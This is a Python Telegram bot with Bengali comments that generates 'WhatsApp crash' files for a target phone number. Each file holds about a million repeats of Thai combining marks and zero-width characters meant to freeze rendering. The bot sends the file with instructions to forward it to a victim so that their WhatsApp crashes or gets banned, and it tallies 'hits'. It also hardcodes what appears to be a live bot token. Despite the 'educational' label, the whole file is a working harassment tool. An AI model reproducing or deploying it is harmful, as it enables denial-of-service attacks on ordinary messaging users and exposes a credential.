import logging
import sqlite3
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ (সার্ভারে বট রান করছে কি না তা দেখার জন্য)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. আপনার টেলিগ্রাম বট টোকেন
TOKEN = "8512245764:AAG_mZvW6aw0jHvGIwckU9cTwUGt6-4zh-0"

# ৩. ডেটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('m_r_developer_stats.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. পেলোড তৈরির ফাংশন (১০ লক্ষ ক্যারেক্টার যুক্ত শক্তিশালী ফাইল)
def create_crash_payload(target_number):
    # জটিল ইউনিকোড প্যাটার্ন যা রেন্ডারিং ইঞ্জিনকে ফ্রিজ করে দেয়
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 30
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 40
    
    # ১০ লক্ষ বার রিপিটেশন (অত্যন্ত শক্তিশালী পেলোড)
    # এটি সরাসরি ফাইলে রাইট হবে যাতে র‍্যামে চাপ না পড়ে
    final_data = (crash_pattern + invisible_mass) * 1000000 
    
    file_name = f"WHATSAPP_CRASH_{target_number}.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(final_data)
    return file_name

# ৫. স্টার্ট কমান্ড এবং মেইন ইন্টারফেস
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 Attack WhatsApp", callback_data='attack')],
        [InlineKeyboardButton("📊 Status", callback_data='status')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "🔥 **M R DEVELOPER CRASH BOT** 🔥\n\n"
        "স্বাগতম! এই বটটি শিক্ষামূলক উদ্দেশ্যে তৈরি।\n"
        "নিচের বাটন ব্যবহার করে অপারেশন শুরু করুন।"
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# ৬. বাটন ক্লিক হ্যান্ডলার
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'attack':
        await query.edit_message_text("টার্গেট হোয়াটসঅ্যাপ নম্বরটি দিন (যেমন: 88017XXXXXXXX):")
        context.user_data['state'] = 'WAITING_FOR_NUM'
    
    elif query.data == 'status':
        conn = sqlite3.connect('m_r_developer_stats.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total_hits = cur.fetchone()[0]
        conn.close()
        await query.edit_message_text(f"📊 **অপারেশন স্ট্যাটাস**\n\nআজ পর্যন্ত মোট সফল হিট: {total_hits} টি")

# ৭. নম্বর প্রসেসিং এবং ফাইল সেন্ডিং
async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('state') == 'WAITING_FOR_NUM':
        target_num = update.message.text
        context.user_data['state'] = None
        
        # স্ট্যাটাস মেসেজ
        progress_msg = await update.message.reply_text(f"⏳ {target_num} এর জন্য ডাটা ফাইল তৈরি হচ্ছে...")
        
        try:
            # পেলোড ফাইল তৈরি
            file_path = create_crash_payload(target_num)
            
            # ফাইল পাঠানো
            with open(file_path, 'rb') as doc:
                await update.message.reply_document(
                    document=doc,
                    caption=(
                        f"✅ **সফল ভাবে তৈরি হয়েছে!**\n\n"
                        f"Target: `{target_num}`\n\n"
                        f"⚠️ **ব্যবহার:** এই ফাইলটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান। "
                        f"ভিকটিম এটি ওপেন করলে তার হোয়াটসঅ্যাপ ক্রাশ বা ব্যান হওয়ার সম্ভাবনা থাকবে।"
                    ),
                    parse_mode='Markdown'
                )
            
            # স্ট্যাটাস আপডেট করা
            conn = sqlite3.connect('m_r_developer_stats.db')
            cur = conn.cursor()
            cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
            conn.commit()
            conn.close()
            
            # ক্লিনআপ (সার্ভার থেকে ফাইল ডিলিট)
            os.remove(file_path)
            await progress_msg.delete()
            
        except Exception as e:
            await update.message.reply_text(f"❌ এরর: {str(e)}")

# ৮. মেইন রানার ফাংশন
def main():
    init_db()
    
    # অ্যাপ্লিকেশন তৈরি
    application = Application.builder().token(TOKEN).build()
    
    # হ্যান্ডলার রেজিস্ট্রেশন
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_message))
    
    print("M R DEVELOPER Bot is running on Railway...")
    application.run_polling()

if __name__ == '__main__':
    main()
        
